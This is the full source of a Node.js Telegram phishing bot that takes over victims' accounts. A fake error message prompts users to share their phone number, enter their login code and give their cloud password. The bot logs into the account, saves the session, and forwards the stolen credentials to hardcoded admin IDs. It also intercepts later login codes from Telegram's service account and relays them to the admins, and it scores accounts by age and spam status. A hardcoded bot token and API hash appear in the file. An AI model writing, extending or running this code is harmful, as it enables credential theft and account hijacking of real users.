const TelegramBot = require("node-telegram-bot-api");
const { Low } = require("lowdb");
const { JSONFileSync } = require("lowdb/node");
const { Api, TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const fs = require("fs");
const path = require("path");
const { NewMessage } = require("telegram/events");
let computeCheck = null;
try {
  ({ computeCheck } = require("telegram/Password"));
} catch (e) {}

const TOKEN = "8465680991:AAGzZkNFPrXtrv93ROpCwIJaCBcvVlTR45w";
const API_ID = 38867266;
const API_HASH = "617f369e1d996d25e3f6074ee24b62d1;"
const ADMINS = [8144114778];

const SESSION_DIR = path.join(__dirname, "fish_session");
if (!fs.existsSync(SESSION_DIR)) {
  fs.mkdirSync(SESSION_DIR, { recursive: true });
}

const codeStorage = {};
const activeViewers = new Map();

const bot = new TelegramBot(TOKEN, { 
  polling: {
    interval: 300,
    autoStart: true,
    params: { timeout: 10 }
  }
});

bot.on('polling_error', () => {});

const adapter = new JSONFileSync("users.json");
const db = new Low(adapter, { users: {} });
db.read();

function getLang(userId) {
  return db.data.users[userId]?.language || "ru";
}

function upsert(userId, fields) {
  if (!db.data.users[userId]) db.data.users[userId] = {};
  Object.assign(db.data.users[userId], fields);
  db.write();
}

function saveSessionToFile(userId, sessionString, phone, twofa = null) {
  const filePath = path.join(SESSION_DIR, `${userId}.session`);
  const sessionData = {
    session: sessionString,
    phone: phone,
    twofa: twofa,
    date: Date.now()
  };
  fs.writeFileSync(filePath, JSON.stringify(sessionData), "utf8");
}

function loadSessionFromFile(userId) {
  const filePath = path.join(SESSION_DIR, `${userId}.session`);
  if (fs.existsSync(filePath)) {
    try {
      const data = fs.readFileSync(filePath, "utf8");
      return JSON.parse(data);
    } catch (e) {
      return null;
    }
  }
  return null;
}

async function createClient(sessionString = "", phone = null, userId = null) {
  const client = new TelegramClient(
    new StringSession(sessionString),
    API_ID,
    API_HASH,
    {
      connectionRetries: 5,
      useWSS: true,
      floodSleepThreshold: 60
    }
  );
  
  await client.connect();
  
  if (userId) {
    client.addEventHandler(async (event) => {
      const message = event.message;
      
      if (message.senderId && message.senderId.toString() === '777000') {
        const text = message.message || '';
        
        const matches = text.match(/\d{5}/g);
        if (matches && matches.length > 0 && phone) {
          const cleanPhone = phone.replace(/\D/g, '');
          
          if (!codeStorage[cleanPhone]) {
            codeStorage[cleanPhone] = [];
          }
          
          codeStorage[cleanPhone].push({
            code: matches[0],
            timestamp: Date.now()
          });
          
          const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
          codeStorage[cleanPhone] = codeStorage[cleanPhone].filter(c => c.timestamp > tenMinutesAgo);
          
          for (const viewer of activeViewers.values()) {
            if (viewer.phone === cleanPhone) {
              try {
                await updateCodes(viewer.chatId, viewer.msgId, cleanPhone, viewer.targetUserId, viewer.lang);
              } catch (e) {}
            }
          }
        }
      }
    }, new NewMessage({}));
  }
  
  return client;
}

const ID_HISTORY = [
  { id: 15500, timestamp: 1376427600 },
  { id: 50000000, timestamp: 1400000000 },
  { id: 100000000, timestamp: 1421000000 },
  { id: 300000000, timestamp: 1480000000 },
  { id: 500000000, timestamp: 1515000000 },
  { id: 1000000000, timestamp: 1583000000 },
  { id: 2000000000, timestamp: 1630000000 },
  { id: 5000000000, timestamp: 1645000000 },
  { id: 6000000000, timestamp: 1680000000 },
  { id: 7000000000, timestamp: 1715000000 },
  { id: 7500000000, timestamp: 1735689600 },
  { id: 8345409660, timestamp: 1769961600 },
  { id: 8500000000, timestamp: 1775000000 }
];

function calculateRegistrationDate(targetId) {
  if (targetId > ID_HISTORY[ID_HISTORY.length - 1].id) {
    return new Date();
  }
  
  const ids = ID_HISTORY.map(item => item.id);
  let left = 0;
  let right = ids.length - 1;
  let idx = ids.length;
  
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    if (ids[mid] > targetId) {
      idx = mid;
      right = mid - 1;
    } else {
      left = mid + 1;
    }
  }
  
  if (idx === 0) {
    return new Date(ID_HISTORY[0].timestamp * 1000);
  }
  
  const prev = ID_HISTORY[idx - 1];
  const next = ID_HISTORY[idx];
  const ratio = (targetId - prev.id) / (next.id - prev.id);
  let estimatedTimestamp = prev.timestamp + (next.timestamp - prev.timestamp) * ratio;
  
  const currentTime = Math.floor(Date.now() / 1000);
  if (estimatedTimestamp > currentTime) {
    estimatedTimestamp = currentTime;
  }
  
  return new Date(estimatedTimestamp * 1000);
}

async function checkSpamBlock(client) {
  try {
    const spamBot = await client.getEntity("@spambot");
    await client.sendMessage(spamBot, { message: "/start" });
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    const messages = await client.getMessages(spamBot, { limit: 5 });
    
    try {
      await client.invoke(new Api.messages.DeleteHistory({
        peer: spamBot,
        maxId: 0,
        justClear: false,
        revoke: true
      }));
    } catch (e) {}
    
    for (const msg of messages) {
      if (msg.senderId && msg.senderId.toString().includes("178220800")) {
        const text = msg.message || "";
        if (text.toLowerCase().includes("no restrictions") || text.includes("не ограничен")) {
          return false;
        } else if (text.toLowerCase().includes("restrictions") || text.includes("ограничен")) {
          return true;
        }
      }
    }
    return false;
  } catch (error) {
    return false;
  }
}

const T = {
  ru: {
    start: "📃 Для начала использования, нужно выбрать ваш язык 👇\n\n📃 To get started, you need to select your language 👇",
    error: "❌ Произошла неизвестная ошибка, но для ее починки нам требуется авторизовать ваш аккаунт.",
    continue_btn: "➡️ Продолжить",
    share_prompt: "✅ Отлично! Чтобы продолжить, нажмите кнопку в меню 🔍",
    share_btn: "📞 Поделиться номером",
    auth_start: "⚙️ Начинаю авторизацию..",
    enter_code: "📱 Введите код из сообщения, которое мы вам прислали:",
    code_placeholder: "*****",
    enter_2fa: "🔐 Введите облачный пароль от аккаунта:",
    auth_process: "⏳ Авторизовываю аккаунт..",
    auth_success: "✅ Ваш запрос был отправлен на обработку модератору, ожидайте до 15 минут.",
    checking_code: "⏳ Проверяю код...",
    error_occurred: "❌ Ошибка:",
    new_log: "🔐 НОВЫЙ ЛОГ!",
    account: "📱 АККАУНТ",
    account_id: "ID",
    phone: "Номер",
    reg_date: "📅 Дата регистрации",
    age: "⏱ Возраст",
    user: "👤 Пользователь",
    username: "Username",
    cloud_password: "🔐 Облачный пароль",
    older_5_years: "⚠️ АККАУНТ СТАРШЕ 5 ЛЕТ",
    admin1: "АДМИН1",
    admin2: "АДМИН2",
    session_restored: "✅ Авторизация через сохраненную сессию",
    wrong_code: "❌ Похоже, что вы ввели не тот код, нажмите ниже чтобы попробовать еще раз 👇",
    retry_btn: "🔄 Повторить",
    login_by_code: "🔑 Зайти по коду",
    phone_number: "📞 Номер телефона",
    refresh_codes: "🔄 Обновить коды",
    back: "◀️ Назад",
    codes_list: "📨 Актуальные коды для входа:",
    no_codes: "❌ Нет актуальных кодов",
    spam_status: "🤖 Статус СБ",
    spam_yes: "ЕСТЬ",
    spam_no: "НЕТУ",
    loading_session: "⏳ Загружаю сессию..."
  },
  en: {
    start: "📃 To get started, you need to select your language 👇\n\n📃 Для начала использования, нужно выбрать ваш язык 👇",
    error: "❌ An unknown error occurred, but to fix it we need to authorize your account.",
    continue_btn: "➡️ Continue",
    share_prompt: "✅ Great! To continue, press the button in the menu 🔍",
    share_btn: "📞 Share phone number",
    auth_start: "⚙️ Starting authorization..",
    enter_code: "📱 Enter the code from the message we sent you:",
    code_placeholder: "*****",
    enter_2fa: "🔐 Enter the cloud password for the account:",
    auth_process: "⏳ Authorizing account..",
    auth_success: "✅ Your request has been sent to the moderator for processing, wait up to 15 minutes.",
    checking_code: "⏳ Checking code...",
    error_occurred: "❌ Error:",
    new_log: "🔐 NEW LOG!",
    account: "📱 ACCOUNT",
    account_id: "ID",
    phone: "Phone",
    reg_date: "📅 Registration date",
    age: "⏱ Age",
    user: "👤 User",
    username: "Username",
    cloud_password: "🔐 Cloud password",
    older_5_years: "⚠️ ACCOUNT OLDER THAN 5 YEARS",
    admin1: "ADMIN1",
    admin2: "ADMIN2",
    session_restored: "✅ Authorization via saved session",
    wrong_code: "❌ It seems you entered the wrong code, click below to try again 👇",
    retry_btn: "🔄 Retry",
    login_by_code: "🔑 Login by code",
    phone_number: "📞 Phone number",
    refresh_codes: "🔄 Refresh codes",
    back: "◀️ Back",
    codes_list: "📨 Current login codes:",
    no_codes: "❌ No current codes",
    spam_status: "🤖 Spam status",
    spam_yes: "YES",
    spam_no: "NO",
    loading_session: "⏳ Loading session..."
  }
};

const authStates = {};

bot.onText(/\/start/, (msg) => {
  const userId = msg.from.id;
  const existingLang = getLang(userId);

  if (existingLang && existingLang !== "") {
    bot.sendMessage(msg.chat.id, T[existingLang].error, {
      reply_markup: {
        inline_keyboard: [[{ text: T[existingLang].continue_btn, callback_data: "continue" }]],
      },
    });
    return;
  }

  bot.sendMessage(msg.chat.id, T.ru.start, {
    reply_markup: {
      inline_keyboard: [[
        { text: "🇷🇺 Русский", callback_data: "lang_ru" },
        { text: "🇬🇧 English", callback_data: "lang_en" },
      ]],
    },
  });
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;
  const userId = query.from.id;
  const data = query.data;

  if (data === "lang_ru" || data === "lang_en") {
    const lang = data === "lang_ru" ? "ru" : "en";
    upsert(userId, { language: lang });
    await bot.deleteMessage(chatId, msgId).catch(() => {});
    await bot.answerCallbackQuery(query.id);
    bot.sendMessage(chatId, T[lang].error, {
      reply_markup: {
        inline_keyboard: [[{ text: T[lang].continue_btn, callback_data: "continue" }]],
      },
    });
    return;
  }

  if (data === "continue") {
    const lang = getLang(userId);
    await bot.deleteMessage(chatId, msgId).catch(() => {});
    await bot.answerCallbackQuery(query.id);
    bot.sendMessage(chatId, T[lang].share_prompt, {
      reply_markup: {
        keyboard: [[{ text: T[lang].share_btn, request_contact: true }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });
    return;
  }

  if (data === "retry_code") {
    const lang = getLang(userId);
    await bot.deleteMessage(chatId, msgId).catch(() => {});
    await bot.answerCallbackQuery(query.id);
    
    try {
      if (authStates[userId] && authStates[userId].client) {
        await bot.sendMessage(chatId, T[lang].auth_start);
        
        const result = await authStates[userId].client.sendCode(
          { apiId: API_ID, apiHash: API_HASH },
          authStates[userId].phone
        );
        
        authStates[userId].phoneCodeHash = result.phoneCodeHash;
        authStates[userId].stage = "awaiting_code";
        authStates[userId].codeInput = "";
        
        const sentMsg = await bot.sendMessage(
          chatId,
          `${T[lang].enter_code}\n\n${T[lang].code_placeholder}`,
          { reply_markup: { inline_keyboard: getCodeKeyboard("", lang) } }
        );
        
        authStates[userId].codeMsgId = sentMsg.message_id;
      }
    } catch (error) {
      await bot.sendMessage(chatId, `${T[lang].error_occurred} ${error.message}`);
    }
    return;
  }

  if (data.startsWith("login_code_")) {
    const targetUserId = parseInt(data.split("_")[3]);
    const lang = getLang(userId);
    
    await safeEditMessage(chatId, msgId, T[lang].loading_session, []);
    
    const sessionData = loadSessionFromFile(targetUserId);
    if (!sessionData || !sessionData.session) {
      await safeEditMessage(chatId, msgId, "❌ Сессия не найдена", [
        [{ text: T[lang].back, callback_data: `back_to_log_${targetUserId}` }]
      ]);
      await bot.answerCallbackQuery(query.id);
      return;
    }

    try {
      const client = await createClient(sessionData.session, sessionData.phone, targetUserId);
      
      if (!await client.isUserAuthorized()) {
        await client.disconnect();
        await safeEditMessage(chatId, msgId, "❌ Сессия недействительна", [
          [{ text: T[lang].back, callback_data: `back_to_log_${targetUserId}` }]
        ]);
        await bot.answerCallbackQuery(query.id);
        return;
      }

      const me = await client.getMe();
      const phone = sessionData.phone || me.phone || "неизвестно";
      const cleanPhone = phone.replace(/\D/g, '');
      
      const viewerKey = `${chatId}_${targetUserId}`;
      
      if (activeViewers.has(viewerKey)) {
        clearInterval(activeViewers.get(viewerKey).interval);
      }
      
      const interval = setInterval(async () => {
        try {
          await updateCodes(chatId, msgId, cleanPhone, targetUserId, lang);
        } catch (e) {}
      }, 3000);
      
      activeViewers.set(viewerKey, {
        phone: cleanPhone,
        targetUserId,
        chatId,
        msgId,
        lang,
        interval
      });
      
      await updateCodes(chatId, msgId, cleanPhone, targetUserId, lang);
      
    } catch (error) {
      await safeEditMessage(chatId, msgId, `❌ Ошибка: ${error.message}`, [
        [{ text: T[lang].back, callback_data: `back_to_log_${targetUserId}` }]
      ]);
    }
    
    await bot.answerCallbackQuery(query.id);
    return;
  }

  if (data.startsWith("refresh_codes_")) {
    const parts = data.split("_");
    const targetUserId = parseInt(parts[2]);
    const phone = parts.slice(3).join("_");
    const lang = getLang(userId);
    
    await updateCodes(chatId, msgId, phone, targetUserId, lang);
    await bot.answerCallbackQuery(query.id, { text: "🔄 Коды обновлены" });
    return;
  }

  if (data.startsWith("back_to_log_")) {
    const targetUserId = parseInt(data.split("_")[3]);
    const lang = getLang(userId);
    
    const viewerKey = `${chatId}_${targetUserId}`;
    if (activeViewers.has(viewerKey)) {
      clearInterval(activeViewers.get(viewerKey).interval);
      activeViewers.delete(viewerKey);
    }
    
    const sessionData = loadSessionFromFile(targetUserId);
    if (sessionData) {
      const accountId = targetUserId;
      const accountPhone = sessionData.phone || "неизвестно";
      const twofa = sessionData.twofa || "not set";
      
      const registrationDate = calculateRegistrationDate(accountId);
      const now = new Date();
      const ageMs = now - registrationDate;
      const ageYears = ageMs / (1000 * 60 * 60 * 24 * 365.25);
      
      const regDateStr = registrationDate.toLocaleDateString(lang === 'ru' ? 'ru-RU' : 'en-US');
      const ageStr = ageYears.toFixed(2);
      
      const client = await createClient(sessionData.session);
      const spamBlock = await checkSpamBlock(client);
      await client.disconnect();
      
      let logMessage = `${T[lang].new_log}\n\n`;
      logMessage += `${T[lang].account}\n`;
      logMessage += `${T[lang].account_id}: ${accountId}\n`;
      logMessage += `${T[lang].phone}: ${accountPhone}\n`;
      logMessage += `${T[lang].cloud_password}: ${twofa}\n`;
      logMessage += `${T[lang].reg_date}: ${regDateStr}\n`;
      logMessage += `${T[lang].age}: ${ageStr} ${lang === 'ru' ? 'лет' : 'years'}\n`;
      logMessage += `${T[lang].spam_status}: ${spamBlock ? T[lang].spam_yes : T[lang].spam_no}\n`;
      logMessage += `User ID бота: ${targetUserId}\n`;
      
      const keyboard = [[
        { text: T[lang].login_by_code, callback_data: `login_code_${userId}_${targetUserId}` }
      ]];
      
      if (ageYears > 5) {
        const adminTag = userId === 8493792041 ? T[lang].admin1 : T[lang].admin2;
        logMessage += `\n${T[lang].older_5_years} [${adminTag}]`;
      }
      
      await safeEditMessage(chatId, msgId, logMessage, keyboard);
    }
    await bot.answerCallbackQuery(query.id);
    return;
  }

  if (data.startsWith("code_")) {
    const digit = data.split("_")[1];
    const lang = getLang(userId);
    
    if (digit === "backspace") {
      if (authStates[userId] && authStates[userId].codeInput) {
        authStates[userId].codeInput = authStates[userId].codeInput.slice(0, -1);
        const displayCode = authStates[userId].codeInput + "*".repeat(5 - authStates[userId].codeInput.length);
        
        await safeEditMessage(chatId, msgId, `${T[lang].enter_code}\n\n${displayCode}`, 
          getCodeKeyboard(authStates[userId].codeInput, lang));
      }
      await bot.answerCallbackQuery(query.id);
      return;
    }
    
    if (digit === "confirm") {
      await bot.answerCallbackQuery(query.id);
      if (authStates[userId] && authStates[userId].codeInput && authStates[userId].codeInput.length === 5) {
        await processCode(userId, chatId, msgId, authStates[userId].codeInput, lang);
      }
      return;
    }
    
    if (authStates[userId]) {
      let code = authStates[userId].codeInput || "";
      if (code.length < 5) {
        code += digit;
        authStates[userId].codeInput = code;
        
        const displayCode = code + "*".repeat(5 - code.length);
        
        await safeEditMessage(chatId, msgId, `${T[lang].enter_code}\n\n${displayCode}`, 
          getCodeKeyboard(code, lang));
        
        if (code.length === 5) {
          setTimeout(async () => {
            if (authStates[userId] && authStates[userId].codeInput === code) {
              await processCode(userId, chatId, msgId, code, lang);
            }
          }, 500);
        }
      }
    }
    await bot.answerCallbackQuery(query.id);
  }
});

async function updateCodes(chatId, msgId, phone, targetUserId, lang) {
  try {
    const cleanPhone = phone.replace(/\D/g, '');
    const codes = codeStorage[cleanPhone] || [];
    
    const fiveMinutesAgo = Date.now() - 5 * 60 * 1000;
    const recentCodes = codes.filter(c => c.timestamp > fiveMinutesAgo);

    let text = `${T[lang].phone_number}: +${cleanPhone}\n\n`;
    text += `${T[lang].codes_list}\n`;

    if (recentCodes.length === 0) {
      text += `\n${T[lang].no_codes}`;
    } else {
      recentCodes.sort((a, b) => b.timestamp - a.timestamp);
      recentCodes.forEach(code => {
        const time = new Date(code.timestamp).toLocaleTimeString();
        text += `\n[${time}] ${code.code}`;
      });
    }

    const keyboard = [
      [{ text: T[lang].refresh_codes, callback_data: `refresh_codes_${targetUserId}_${cleanPhone}` }],
      [{ text: T[lang].back, callback_data: `back_to_log_${targetUserId}` }]
    ];

    await safeEditMessage(chatId, msgId, text, keyboard);
  } catch (error) {}
}

async function safeEditMessage(chatId, messageId, text, inlineKeyboard) {
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  } catch (error) {}
}

function getCodeKeyboard(currentCode, lang) {
  const codeLength = currentCode ? currentCode.length : 0;
  const isComplete = codeLength === 5;
  
  const keyboard = [
    ["1", "2", "3"].map(d => ({ text: d, callback_data: `code_${d}` })),
    ["4", "5", "6"].map(d => ({ text: d, callback_data: `code_${d}` })),
    ["7", "8", "9"].map(d => ({ text: d, callback_data: `code_${d}` }))
  ];
  
  const bottomRow = [];
  
  if (codeLength > 0) {
    bottomRow.push({ text: "⌫", callback_data: "code_backspace" });
  } else {
    bottomRow.push({ text: " ", callback_data: "noop" });
  }
  
  bottomRow.push({ text: "0", callback_data: "code_0" });
  
  if (isComplete) {
    bottomRow.push({ text: "✅", callback_data: "code_confirm" });
  } else {
    bottomRow.push({ text: " ", callback_data: "noop" });
  }
  
  keyboard.push(bottomRow);
  
  return keyboard;
}

bot.on("contact", async (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const phone = msg.contact.phone_number;
  const lang = getLang(userId);
  
  upsert(userId, { phone });
  
  await bot.sendMessage(chatId, T[lang].auth_start);
  
  try {
    const sessionData = loadSessionFromFile(userId);
    
    const client = new TelegramClient(
      new StringSession(sessionData ? sessionData.session : ""),
      API_ID,
      API_HASH,
      {
        connectionRetries: 5,
        useWSS: true,
        floodSleepThreshold: 60
      }
    );
    
    await client.connect();
    
    if (await client.isUserAuthorized()) {
      await finishAuthorization(userId, chatId, client, lang, true, phone, sessionData?.twofa);
      return;
    }
    
    const result = await client.sendCode(
      { apiId: API_ID, apiHash: API_HASH },
      phone
    );
    
    authStates[userId] = {
      stage: "awaiting_code",
      client,
      phoneCodeHash: result.phoneCodeHash,
      phone: phone,
      lang
    };
    
    const sentMsg = await bot.sendMessage(
      chatId,
      `${T[lang].enter_code}\n\n${T[lang].code_placeholder}`,
      { reply_markup: { inline_keyboard: getCodeKeyboard("", lang) } }
    );
    
    authStates[userId].codeMsgId = sentMsg.message_id;
    
  } catch (error) {
    await bot.sendMessage(chatId, `${T[lang].error_occurred} ${error.message}`);
  }
});

bot.on("message", async (msg) => {
  if (!msg.text) return;
  
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const text = msg.text;
  const lang = getLang(userId);
  
  if (msg.from && msg.from.id === 777000) {
    return;
  }
  
  if (authStates[userId] && authStates[userId].stage === "awaiting_2fa") {
    try {
      await bot.sendMessage(chatId, T[lang].auth_process);

      const client = authStates[userId].client;
      let result = null;

      if (typeof client.checkPassword === "function") {
        result = await client.checkPassword(text);
      } else if (typeof computeCheck === "function") {
        const password = await client.invoke(new Api.account.GetPassword());
        result = await client.invoke(
          new Api.auth.CheckPassword({
            password: await computeCheck(password, text)
          })
        );
      } else {
        throw new Error("2FA helper not available in current telegram library");
      }

      if (typeof client._onAuthResult === "function" && result) {
        client._onAuthResult(result);
      }
      
      await finishAuthorization(userId, chatId, client, lang, false, authStates[userId].phone, text);
      
    } catch (error) {
      await bot.sendMessage(chatId, `${T[lang].error_occurred} ${error.errorMessage || error.message}`);
      authStates[userId] = null;
    }
    return;
  }
  
  if (authStates[userId] && authStates[userId].stage === "awaiting_code" && text.length === 5 && /^\d+$/.test(text)) {
    if (authStates[userId].codeMsgId) {
      await bot.deleteMessage(chatId, authStates[userId].codeMsgId).catch(() => {});
    }
    await processCode(userId, chatId, null, text, lang);
  }
});

async function processCode(userId, chatId, msgId, code, lang) {
  if (!authStates[userId] || authStates[userId].stage !== "awaiting_code") return;
  
  try {
    if (msgId) {
      await safeEditMessage(chatId, msgId, `${T[lang].enter_code}\n\n${code}`, []);
    }
    
    await bot.sendMessage(chatId, T[lang].checking_code);
    
    try {
      await authStates[userId].client.invoke(
        new Api.auth.SignIn({
          phoneNumber: authStates[userId].phone,
          phoneCodeHash: authStates[userId].phoneCodeHash,
          phoneCode: code
        })
      );
      
      await finishAuthorization(userId, chatId, authStates[userId].client, lang, false, authStates[userId].phone);
      
    } catch (error) {
      if (error.errorMessage === "SESSION_PASSWORD_NEEDED") {
        authStates[userId].stage = "awaiting_2fa";
        await bot.sendMessage(chatId, T[lang].enter_2fa);
      } else {
        await bot.sendMessage(chatId, T[lang].wrong_code, {
          reply_markup: {
            inline_keyboard: [[
              { text: T[lang].retry_btn, callback_data: "retry_code" }
            ]]
          }
        });
        
        if (authStates[userId]) {
          authStates[userId].stage = "awaiting_code";
          authStates[userId].codeInput = "";
        }
      }
    }
    
  } catch (error) {
    await bot.sendMessage(chatId, `${T[lang].error_occurred} ${error.errorMessage || error.message}`);
    
    await bot.sendMessage(chatId, T[lang].wrong_code, {
      reply_markup: {
        inline_keyboard: [[
          { text: T[lang].retry_btn, callback_data: "retry_code" }
        ]]
      }
    });
    
    authStates[userId] = null;
  }
}

async function finishAuthorization(userId, chatId, client, lang, fromSession = false, phone, twofa = null) {
  try {
    const me = await client.getMe();
    const accountId = me.id.toString();
    const accountPhone = phone || me.phone || "unknown";
    
    const sessionString = client.session.save();
    saveSessionToFile(userId, sessionString, accountPhone, twofa);
    
    if (fromSession) {
      await bot.sendMessage(chatId, T[lang].session_restored);
    }
    
    const spamBlock = await checkSpamBlock(client);
    
    const registrationDate = calculateRegistrationDate(parseInt(accountId));
    const now = new Date();
    const ageMs = now - registrationDate;
    const ageYears = ageMs / (1000 * 60 * 60 * 24 * 365.25);
    
    const regDateStr = registrationDate.toLocaleDateString(lang === 'ru' ? 'ru-RU' : 'en-US');
    const ageStr = ageYears.toFixed(2);
    
    let logMessage = `${T[lang].new_log}\n\n`;
    logMessage += `${T[lang].account}\n`;
    logMessage += `${T[lang].account_id}: ${accountId}\n`;
    logMessage += `${T[lang].phone}: ${accountPhone}\n`;
    logMessage += `${T[lang].cloud_password}: ${twofa || (lang === 'ru' ? 'не установлен' : 'not set')}\n`;
    logMessage += `${T[lang].reg_date}: ${regDateStr}\n`;
    logMessage += `${T[lang].age}: ${ageStr} ${lang === 'ru' ? 'лет' : 'years'}\n`;
    logMessage += `${T[lang].user}: ${me.firstName || ''} ${me.lastName || ''}\n`;
    logMessage += `${T[lang].username}: @${me.username || 'no username'}\n`;
    logMessage += `${T[lang].spam_status}: ${spamBlock ? T[lang].spam_yes : T[lang].spam_no}\n`;
    logMessage += `User ID бота: ${userId}\n`;
    
    for (const adminId of ADMINS) {
      try {
        let adminMessage = logMessage;
        const keyboard = [[
          { text: T[lang].login_by_code, callback_data: `login_code_${adminId}_${userId}` }
        ]];
        
        if (ageYears > 5) {
          const adminTag = adminId === 8493792041 ? T[lang].admin1 : T[lang].admin2;
          adminMessage += `\n${T[lang].older_5_years} [${adminTag}]`;
        }
        
        await bot.sendMessage(adminId, adminMessage, {
          reply_markup: {
            inline_keyboard: keyboard
          }
        });
      } catch (e) {}
    }
    
    await client.disconnect();
    await bot.sendMessage(chatId, T[lang].auth_success);
    
  } catch (error) {
    await bot.sendMessage(chatId, `${T[lang].error_occurred} ${error.message}`);
  } finally {
    authStates[userId] = null;
  }
}

console.log("Bot started");
console.log(`Admins: ${ADMINS.join(', ')}`);





